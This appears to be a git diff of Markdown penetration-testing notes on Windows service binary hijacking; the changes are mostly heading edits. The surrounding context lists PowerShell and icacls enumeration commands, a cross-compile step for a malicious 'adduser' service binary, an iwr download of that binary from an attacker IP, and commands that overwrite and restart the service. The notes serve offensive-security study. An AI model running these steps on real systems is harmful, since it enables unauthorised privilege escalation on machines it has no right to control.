@@ -1,5 +1,4 @@
-# Service Hijacking
-## Enumerate Services that run on boot
+# Enumerate Services that run on boot
 Services from the following paths are not writeable to user:
 * C:\Program Files
 * C:\Program Files (x86)
@@ -15,7 +14,7 @@ Get-Service | Where-Object { $_.StartType -eq 'Automatic' } | Select-Object Name
 ```powershell
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
 ```
-## Check interesting service for user writeable permissions
+# Check interesting service for user writeable permissions
 icacls returns the following values related to permissions:
 * F - Full access
 * M - Modify access
@@ -27,10 +26,7 @@ BUILTIN\Users or another group the compromised user is in must have (W), (M) or 
 ```powershell
 icacls "C:\path\to\interesting\service.exe"
 ```
-```
-<insert output here>
-```
-## Create new malicious service binary
+# Create new malicious service binary
 Example malicious service to use:
 ```c
 #include <stdlib.h>
@@ -49,7 +45,7 @@ On kali, cross-compile the service:
 ```batch
 x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 ```
-## Hijack interesting service with a malicious binary
+# Hijack interesting service with a malicious binary
 Transfer the service to the target machine:
 ```powershell
 iwr -uri http://$(IP_ADDRESS)/adduser.exe -Outfile adduser.exe
@@ -62,7 +58,7 @@ Replace service binary with new malicious service:
 ```powershell
 move .\adduser.exe C:\path\to\interesting\service.exe
 ```
-### Restart service
+## Restart service
 If the user has the appropriate permmissions:
 ```powershell
 net stop $ServiceName
